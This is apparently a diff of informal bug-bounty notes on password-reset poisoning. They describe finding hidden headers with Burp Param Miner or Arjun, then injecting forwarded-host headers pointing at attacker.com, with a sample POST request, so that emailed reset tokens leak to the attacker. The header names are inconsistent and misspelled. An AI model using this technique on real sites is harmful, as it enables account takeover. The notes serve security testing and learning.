@@ -7,3 +7,16 @@ add x-forwarded-host: attacker.com in headers
 in email link will be  attacker.com?token=4841641654618465
 
 --------------------------------------------------------------------------------------------------------------------
+
+in password reset link token is send by server 
+
+pick the requests run param miner from burpsuite or arjun or anyother tool 
+
+for headers check if host-forwarded-for is available or not 
+in one server there are 2 3 application and one reverse proxy like nginx 
+so this header is use 
+
+POST /passwordrestlink?token=494949fvjfngf4fg4fg 
+host : example.com 
+Host-forwarded-for :  attacker.com
+
